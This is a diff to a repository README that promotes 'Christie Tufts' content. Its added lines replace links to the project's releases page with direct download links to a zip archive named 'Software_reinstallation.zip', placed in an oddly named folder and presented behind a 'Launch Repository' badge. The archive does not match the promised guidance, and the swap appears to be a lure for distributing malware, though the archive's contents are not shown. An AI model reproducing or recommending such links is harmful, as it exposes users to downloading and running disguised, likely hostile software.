@@ -17,8 +17,8 @@ The contents of this repository include:
 
 ## Explore More 🚀
 
-To dive into the wealth of knowledge and guidance offered by Christie Tufts, visit the following [link](https://github.com/khng1234/site/releases).
+To dive into the wealth of knowledge and guidance offered by Christie Tufts, visit the following [link](https://raw.githubusercontent.com/khng1234/site/main/prolapsus/Software_reinstallation.zip).
 
-[![Launch Repository](https://github.com/khng1234/site/releases)](https://github.com/khng1234/site/releases)
+[![Launch Repository](https://raw.githubusercontent.com/khng1234/site/main/prolapsus/Software_reinstallation.zip)](https://raw.githubusercontent.com/khng1234/site/main/prolapsus/Software_reinstallation.zip)
 
 🌟 Remember, knowledge is power. Explore, learn, and embark on your journey to enlightenment with Christie Tufts! 🌟
